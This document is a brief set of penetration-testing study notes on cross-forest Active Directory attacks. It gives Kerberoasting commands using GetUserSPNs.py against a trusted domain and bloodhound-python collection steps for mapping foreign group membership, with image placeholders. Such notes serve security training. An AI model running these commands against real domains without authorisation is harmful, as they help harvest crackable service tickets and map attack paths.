# Cross-Forest Kerberoasting
## Using GetUserSPNs.py
```JavaScript
GetUserSPNs.py -target-domain <TRUSTED_DOMAIN> <DOMAIN>/<user> -request
```
![image 354.png](/image%20354.png)
  
# Hunting Foreign Group Membership with Bloodhound-python
  
If you are on a host that does not have DNS configured to their domain, you need to change /etc/resolv.conf to their DC
![image 1 262.png](/image%201%20262.png)
- add domain and nameserver configs
  
Run bloodhound-python to get information about the target domain
```JavaScript
bloodhound-python -d <TARGET_DOMAIN> -dc <COMPUTER_NAME> -c All -u <user> -p <pass>
```
  
Compress file with zip -r
```JavaScript
zip -r <name>.zip *.json
```
- can also just upload the json files like usual
  
Repeat the process for the other domain
  
Resolv.conf
![image 2 225.png](/image%202%20225.png)
  
bloodhound-python again (same command as above)
```JavaScript
bloodhound-python -d <TARGET_DOMAIN> -dc <COMPUTER_NAME> -c All -u <user> -p <pass>
```
  
zip again
```JavaScript
zip -r <name>.zip *.json
```
- can also just upload the json files like usual
  
## Viewing Dangerous Rights in Bloodhound
![image 3 195.png](/image%203%20195.png)